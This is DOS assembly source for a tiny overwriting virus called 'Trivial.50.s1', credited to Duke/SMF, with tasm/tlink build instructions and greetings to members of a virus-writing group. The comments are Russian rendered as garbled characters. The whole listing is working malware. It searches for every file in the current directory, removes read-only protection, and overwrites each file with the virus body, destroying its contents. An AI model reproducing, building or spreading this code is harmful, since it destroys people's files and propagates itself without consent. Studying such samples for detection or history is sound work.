   ; Virus Trivial.50.s1  (c) by Duke/SMF
   ; Compile : tasm tr_50_1.asm
   ;           tlink tr_50_1.obj /t
   ; Greetz to Kouch & Nowhere Man [NuKE]
   ; *®à ¦ ¥â ¢á¥ ä ©«ë (¢ â®¬ ç¨«¥ R/O) ¢ â¥ªãé¥© ¤¨à¥ªâ®à¨¨.

                   .model   tiny
                   .code
                   org     100h
   virus_length    equ     finish - start      ;„«¨  ¢¨àãá 
                   ; §  áç¥â â®£®, çâ® ¤«¨  ¢¨àãá  ¢ëç¨á«ï¥âáï
                   ; ¨¬¥® ¢ íâ®¬ ¬¥áâ¥, ¢ë¨£àë¢ ¥¬ 2 ¡ ©â  !

   start  :                                    ;* ç «® ¢¨àãá 
                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 
                   mov     dx,offset file_spec ;DX ãª §ë¢ ¥â   "*.*"
   infect:
                   int     21h
                   jnc     infect_file         ;…á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬,
                   ret                         ;¢ ¯à®â¨¢®¬ á«ãç ¥ ª®¥æ à ¡®âë.
   infect_file:

                   mov     ah,43h
   ;                mov     ax,4300h           ;*¥à¥¬ ä ©«®¢ë©  âà¨¡ãâë ¨ ¬¥ï¥¬
                   mov     dx,9Eh              ;¨å   ¤®áâã¯ ª çâ¥¨î/§ ¯¨á¨, ¨
                   int     21h                 ;ª®£¤  ¯à¨¤¥â ¢à¥¬ï ®âªàë¢ âì ä ©«
                                               ;¢¨àãá á¬®¦¥â ¯®à §¨âì ä ©«
                                               ;á  âà¨¡ãâ®¬ 'read only'.

                   mov     ax,4301h
                   mov     cl,0                ;” ©« ®áâ ¢«ï¥âáï ¤®áâã¯ë¬
                   int     21h                 ;¤«ï çâ¥¨ï/§ ¯¨á¨.


                   mov     ah,3dh
                   ;al ã¦¥ § ¡¨â à ¥¥
                   int     21h                 ;Žâªàë¢ ¥¬ ä ©« ¤«ï § ¯¨á¨

                   xchg    bx,ax               ;BX á®¤¥à¦¨â ä ©«®¢ë© handle

                   mov     ah,40h              ;”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
                   mov     cl,virus_length     ;CL = áª®«ìª® ¡ ©â ¯¨á âì
                   mov     dx,offset start     ;DX =  ç «® ª®¤  ¢¨àãá 
                   int     21h

                   mov     ah,3Eh              ;‡ ªàë¢ ¥¬ ä ©«
                   int     21h

                   mov     ah,4Fh              ;*®¨áª á«¥¤ãîé¥£® ä ©« 
                   jmp     short infect        ;*¥à¥å®¤   § à ¦¥¨¥

   file_spec       db      "*.*",0             ;Œ áª  ä ©«®¢ ¤«ï ¯®¨áª 

   finish  :                                   ;Š®¥æ ¢¨àãá 
                   end     start
